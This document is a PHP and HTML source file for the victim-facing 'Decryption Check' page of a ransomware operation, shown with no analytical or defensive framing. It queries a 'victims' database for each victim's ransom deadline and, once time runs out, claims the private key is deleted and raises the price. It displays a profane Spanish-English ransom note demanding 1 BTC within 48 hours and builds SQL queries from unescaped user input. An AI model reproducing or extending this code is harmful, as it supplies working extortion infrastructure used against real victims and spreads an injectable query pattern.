<html>
<head>
  <title>
    Decryption Check
  </title>
  <script src="/scripts/jquery.js"></script>
<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "victims";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$timestamp = time();
$dateTimestamp = new DateTime("@$timestamp");

$timestamp = $dateTimestamp->format('Y-m-d H:i:s');

$targetID = $_POST['target_id'];

if (isset($_POST['target_id']) && !empty($_POST['target_id'])) {
   $sql = "SELECT timediff(exp_time, \"$timestamp\") as time_left from target_list where unique_id = \"$targetID\"";
   $result = $conn->query($sql);

   if ($result->num_rows > 0) {
      while($row = $result->fetch_assoc()) {
          if ($row['time_left'] < "00:00:01") {
             echo "<script>" . "\n";
             echo "   $(document).ready(function() {" . "\n";
             echo "     $('#form_div').hide();" . "\n";
             echo "     $('#what_happened').hide();" . "\n";
             echo "   });" . "\n";
             echo "</script>" . "\n";

             $sql1 = "UPDATE target_list SET time_expired=\"1\" where unique_id = \"$targetID\"";
             $result1 = $conn->query($sql1);

             if ($result1->num_rows >= 0) {
                echo "<center>";
                echo "<font color=\"red\">";
                echo "<h3>Time expired, your associated private key has been deleted and your files forever lost!</h3>";
                echo "<br /><br /><br />";
                echo "<h1>Alas, we have a back up key that can be used to decrypt your files; however, the payment has now increased. Please see the payment page for instructions.</h1>";
                echo "</font>";
                echo "<a href=\"/payment.php?unique_id=$targetID\"><input type=\"submit\" value=\"Pay Here\"></a>";
                echo "</center>";
             }
          } else {
             setcookie("unique_id", $targetID, strtotime('+1 hour'));

             $page = $_SERVER['PHP_SELF'];
             $sec = "1";
             header("Refresh: $sec; url=$page");
          }
      } 
   } else {
      echo "<br />Could not determine the time left!</br>"; 
   }
} else {
   $unique_id = $_COOKIE['unique_id'];

   if (isset($_COOKIE['unique_id']) && !empty($_COOKIE['unique_id'])) {

      echo "<script>" . "\n";
      echo "   $(document).ready(function() {" . "\n";
      echo "     $('#form_div').hide();" . "\n";
      echo "     $('#what_happened').hide();" . "\n";
      echo "     setInterval(function() {" . "\n";
      echo "       $.get(\"query.php?unique_id=$unique_id\", function (result) {" . "\n";
      echo "         $('#show_timer').html(result);" . "\n";
      echo "       });" . "\n";
      echo "     }, 1000);" . "\n";
      echo "  });" . "\n";
      echo "</script>" . "\n";
   }
}

$conn->close();

?>

</head>
<body background="/images/hacked.jpg" style='background-repeat: no-repeat; background-attachment: fixed; background-position: center; background-size: 100% 100%;'>
  <font color="red">
  <br /><br />
  <div id="what_happened">
    * What happened to your files?
    <br /><br />
   TU PUTA COMPUTADORA ESTA ENCRIPTADA CON  RSA-4096 using BashCrypt v1.0. 
    <br />
    LA INFORMACIÓN DE LAS CLAVES KEY RSA-4096 can be found here: <a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)">RSA Cryptosystem</a>.
    <br /><br />
    * ESTO QUE VERGAS ES?
    <br /><br />
    TUS DATOS ESTAN ENCRIPTADOS DE POR VIDA.
    <br />
    SI RESTAURAS EL SISTEMA, PERDERAS TODOS TUS DATOS.
    <br />
    PODEMOS NEGOCIAR DE LA MEJOR MANERA QUE SEA POSIBLE.
    <br /><br />
    * QUE HA PASADO?
    <br /><br />
    PAGA 1BTC EN BITCOINS, Y TODO VOLVERA A LA NORMALIDAD. 
    <br />
   NECESITAS LA CLAVE PUBLICA, EN LA QUE LA TENEMOS NOSOTROS HIJO DE PUTA.
    <br />
    DESENCRIPTA TODO, TODO ESTO ES POSIBLE, CARAANCHOA.
    <br /><br />
    * PUTA VIDA?
    <br /><br />
     Paga el rescate en las 48 horas
    <br />
    Esto es RIAL SHIT BRO.
    <br />
   paga JOPUTA.
    <br /><br />
  </div>
  <div id="show_timer"></div>
  <div id="form_div">
    <form action="#" method="POST">
      Unique ID: <input type="text" name="target_id">
      <br />
      <input type="submit" value="Submit">
    </form>
  </div>
  </font>
</body>
<html>
